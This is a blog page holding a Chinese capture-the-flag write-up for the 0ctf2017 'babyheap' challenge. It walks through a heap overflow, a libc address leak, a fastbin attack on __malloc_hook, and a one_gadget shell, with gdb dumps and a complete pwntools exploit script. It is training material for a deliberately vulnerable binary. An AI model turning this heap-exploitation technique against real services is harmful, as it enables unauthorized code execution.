@@ -1,0 +1,528 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>0ctf2017 babyheap wp | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="因为我是堆菜鸟，所以需要…好好调试分析一下…  漏洞点保护全开calloc的size是在Allocate中输入的。而Fill时size是重新输入的，可以造成堆溢出。 分析先关闭PIE方便调试 1sudo sh -c &amp;quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;quot;  在gdb中使用 1skip function alarm">
+<meta name="keywords" content="pwn,wp,堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf2017 babyheap wp">
+<meta property="og:url" content="p1Kk.github.io/2019/12/09/0CTF2017 babyheap/wp/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="因为我是堆菜鸟，所以需要…好好调试分析一下…  漏洞点保护全开calloc的size是在Allocate中输入的。而Fill时size是重新输入的，可以造成堆溢出。 分析先关闭PIE方便调试 1sudo sh -c &amp;quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;quot;  在gdb中使用 1skip function alarm">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/12/08/fEUuPnCHBwFDQyo.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/08/I4dukS78nHCWVLQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/08/YGCQN31sEvFMtpU.png">
+<meta property="og:updated_time" content="2019-12-09T06:44:15.937Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0ctf2017 babyheap wp">
+<meta name="twitter:description" content="因为我是堆菜鸟，所以需要…好好调试分析一下…  漏洞点保护全开calloc的size是在Allocate中输入的。而Fill时size是重新输入的，可以造成堆溢出。 分析先关闭PIE方便调试 1sudo sh -c &amp;quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;quot;  在gdb中使用 1skip function alarm">
+<meta name="twitter:image" content="https://i.loli.net/2019/12/08/fEUuPnCHBwFDQyo.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/12/09/0CTF2017 babyheap/wp/" title="0ctf2017 babyheap wp" itemprop="url">0ctf2017 babyheap wp</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-12-09T06:25:57.256Z" itemprop="datePublished"> Published 2019-12-09</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞点"><span class="toc-number">1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-libc-base"><span class="toc-number">2.1.</span> <span class="toc-text">leak libc_base</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
+		  
+		  </div>
+		  
+		  <blockquote>
+<p>因为我是堆菜鸟，所以需要…好好调试分析一下…</p>
+</blockquote>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>保护全开<br>calloc的size是在<code>Allocate</code>中输入的。而<code>Fill</code>时size是重新输入的，可以造成堆溢出。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先关闭PIE方便调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在gdb中使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip function alarm</span><br></pre></td></tr></table></figure>
+
+<p>跳过alarm函数，方便调试，但是每次调试都需要执行这么一句。<br>或者就通过patch二进制文件删除alarm函数</p>
+<p>#######<br><strong>以下ubuntu16环境</strong></p>
+<p>#######</p>
+<h2 id="leak-libc-base"><a href="#leak-libc-base" class="headerlink" title="leak libc_base"></a>leak libc_base</h2><p>alloc四个fast chunk，一个small chunk</p>
+<p>先释放1，再释放2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x555555757000</span><br><span class="line">0x555555757000:	0x0000000000000000	0x0000000000000021 ==&gt;0</span><br><span class="line">0x555555757010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757020:	0x0000000000000000	0x0000000000000021 ==&gt;1</span><br><span class="line">0x555555757030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757040:	0x0000000000000000	0x0000000000000021 ==&gt;2</span><br><span class="line">0x555555757050:	0x0000555555757020	0x0000000000000000 ==&gt;后入先出，所以chunk2的fd指向chunk1</span><br><span class="line">0x555555757060:	0x0000000000000000	0x0000000000000021 ==&gt;3</span><br><span class="line">0x555555757070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757080:	0x0000000000000000	0x0000000000000091 ==&gt;4</span><br><span class="line">0x555555757090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x555555757120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757130:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>接下来，通过堆溢出漏洞，将chunk2的fd指针第一个字节修改为0x80指向chunk4，由于1， 2都被free，所以通过chunk0进行修改<br>因为申请fast chunk时会检测chunk_size和chunk_index是否匹配【index计算方式为：(chunk size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) – 2，在64位平台上SIZE_SZ为8】，所以我们还需要修改chunk4的size位为0x21</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x10) ==&gt;得到原来chunk2空间</span><br><span class="line">alloc(0x10) ==&gt;得到chunk4空间，可以控制</span><br></pre></td></tr></table></figure>
+
+<p>前提：当内存中只有一个small chunk的时候，且该chunk处于申请空间的内存最高位，那么释放后的fd bk并不会指向libc中的某处<br><img src="https://i.loli.net/2019/12/08/fEUuPnCHBwFDQyo.png" alt="FALSE"><br>所以我们应该再alloc一个small chunk，使chunk4不在最高位<br>再将chunk4的size位修复，使chunk4被释放后，fd bk指向libc某处<br><img src="https://i.loli.net/2019/12/08/I4dukS78nHCWVLQ.png" alt="TRUE"><br>这时候打印chunk2就可以得到top chunk，它与main_arena偏移固定，为0x3c4b78，减去它即得到libc基地址（在fastbin为空时，unsortbin的fd和bk指向自身main_arena）<br><img src="https://i.loli.net/2019/12/08/YGCQN31sEvFMtpU.png" alt></p>
+<p>又，malloc中不为空时，就执行它指向的函数，如果我们将指针改为shell函数，那么调用malloc就会触发getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx &amp;__malloc_hook-0x10</span><br><span class="line">0x7ffff7dd1a90 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1aa0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1ab0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1ac0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1ad0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dd0260	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b00 &lt;__memalign_hook&gt;:	0x00007ffff7a92e20	0x00007ffff7a92a00</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005555557571a0</span><br></pre></td></tr></table></figure>
+
+<p><code>__malloc_hook</code>恰好在<code>main_arena - 0x10</code>处。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10x 0x7ffff7dd1ae0 - 0x3</span><br><span class="line">0x7ffff7dd1add &lt;_IO_wide_data_0+285&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:	0xfff7dd0260000000	0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd:	                        0xfff7a92e20000000	0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f 	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d:	                        0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>偏移为0x3c4b78 - (0x7ffff7dd1b70 - 0x7ffff7dd1aed) = 0x3c4aeb</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><blockquote>
+<p>小tips：缩进的tab或空格不能混用，要么全用tab 要么全用空格。okok我今天才第一次遇见</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">ip = &quot; &quot;</span><br><span class="line">port = 0</span><br><span class="line">io = 0</span><br><span class="line">elf = ELF(&quot;./babyheap_0ctf_2017&quot;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(choice))</span><br><span class="line">def alloc(size):</span><br><span class="line">	menu(1)</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(size))</span><br><span class="line">def fill(idx, size, content):</span><br><span class="line">	menu(2)</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(idx))</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(size))</span><br><span class="line">	io.sendafter(&quot;: &quot;, content)</span><br><span class="line">def free(idx):</span><br><span class="line">	menu(3)</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(idx))</span><br><span class="line">def dump(idx):</span><br><span class="line">	menu(4)</span><br><span class="line">	io.sendlineafter(&quot;: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">	global io</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		io = process(&quot;./babyheap_0ctf_2017&quot;)</span><br><span class="line">		libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		io = remote(ip, port)</span><br><span class="line">		libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	alloc(0x10)		#0</span><br><span class="line">	alloc(0x10)		#1</span><br><span class="line">	alloc(0x10)		#2</span><br><span class="line">	alloc(0x10)		#3</span><br><span class="line">	alloc(0x80)		#4</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	payload = p64(0)*3</span><br><span class="line">	payload += p64(0x21)</span><br><span class="line">	payload += p64(0)*3</span><br><span class="line">	payload += p64(0x21)</span><br><span class="line">	payload += p8(0x80)</span><br><span class="line">	fill(0, len(payload), payload)</span><br><span class="line">	payload = p64(0)*3</span><br><span class="line">	payload += p64(0x21)</span><br><span class="line">	fill(3, len(payload), payload)</span><br><span class="line">	alloc(0x10)		#1==&gt; 2</span><br><span class="line">	alloc(0x10)		#2==&gt; 4</span><br><span class="line">	payload = p64(0)*3</span><br><span class="line">	payload += p64(0x91)</span><br><span class="line">	fill(3, len(payload), payload)</span><br><span class="line">	alloc(0x80)</span><br><span class="line">	free(4)</span><br><span class="line">	dump(2)</span><br><span class="line">	io.recvuntil(&quot;\n&quot;)</span><br><span class="line">	libc_base = u64(io.recvuntil(&quot;Command&quot;)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">	log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line">	</span><br><span class="line">	alloc(0x60)</span><br><span class="line">	free(4)</span><br><span class="line">	 </span><br><span class="line">	payload = p64(libc_base+0x3c4aed)</span><br><span class="line">	fill(2, len(payload), payload)</span><br><span class="line"></span><br><span class="line">	alloc(0x60)</span><br><span class="line">	alloc(0x60)</span><br><span class="line">	one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">	payload = p8(0)*3</span><br><span class="line">	payload += p64(0)*2</span><br><span class="line">	payload += p64(libc_base + one_gadget[1])</span><br><span class="line">	fill(6, len(payload), payload)</span><br><span class="line">	alloc(233)</span><br><span class="line">	io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">  pwn(&quot;node3.buuoj.cn&quot;, 28315, 1)</span><br></pre></td></tr></table></figure>
+
+<p>后面还需要研究<strong>ubuntu18</strong>的利用…<br>这么简单的题目我却调试了一天…实在是菜的抠脚了…</p>
+<blockquote>
+<p>参考：<br><a href="https://nobb.site/2017/08/01/0x36/" target="_blank" rel="noopener">https://nobb.site/2017/08/01/0x36/</a><br><a href="https://www.cnblogs.com/xingzherufeng/p/9844873.html" target="_blank" rel="noopener">https://www.cnblogs.com/xingzherufeng/p/9844873.html</a></p>
+</blockquote>
+<p>小插曲：中间nc还不行了，ping也ping不通，执行<code>service network-manager restart</code><br>就好了</p>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a><a href="/tags/堆/">堆</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/02/11/堆数据结构/heap related data structure/" title="heap related data structure &amp;&amp; ptmalloc2">
+  <span>
+  heap related data structure &amp;&amp; ptmalloc2</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/11/24/C++学习笔记/新建文件夹/C++笔记/"  title="C++ 学习笔记【长期更】">
+ <span>C++ 学习笔记【长期更】
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>15</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HDU/" title="HDU">HDU<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2020 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
